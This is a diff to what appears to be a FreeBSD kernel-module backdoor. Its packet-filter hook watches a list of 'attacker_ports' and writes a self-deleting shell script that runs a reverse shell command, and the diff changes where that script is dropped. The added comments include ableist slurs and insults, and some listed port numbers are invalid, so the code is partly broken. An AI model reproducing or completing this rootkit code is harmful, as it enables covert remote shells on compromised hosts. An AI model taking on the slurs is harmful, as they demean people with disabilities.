@@ -29,7 +29,8 @@
 
 static int attacker_ports[] = {22, 80, 443, 8080, 21, 42069, 80085, 69, 420, 2200}; // List of target ports
 
-int kern_execve(struct thread *td, struct execve_args *uap);
+// u ret this is no allowed bruv
+// int kern_execve(struct thread *td, struct execve_args *uap);
 
 
 
@@ -107,6 +108,7 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
                 // this is where we are having issues!!
                 // this is where we are having issues!!
                 // this is where we are having issues!!
+                // just read a damn book reatard
 
 
 
@@ -142,7 +144,7 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
 
 
                   // File path to create
-                char *filepath = "/root/lkm_trigger.sh";
+                char *filepath = "/lkm_trigger.sh";
 
                 // Initialize nameidata for file creation
                 NDINIT(&nd, LOOKUP, NOFOLLOW, UIO_SYSSPACE, filepath, curthread);
@@ -157,6 +159,7 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
 
                 // Write contents to file
                 char file_content[200];
+                // can't use snprintf retard.
                 snprintf(file_content, sizeof(file_content),
                     "#!/bin/sh\n%s\nrm -- \"$0\"\n", reverse_shell_cmd);
 
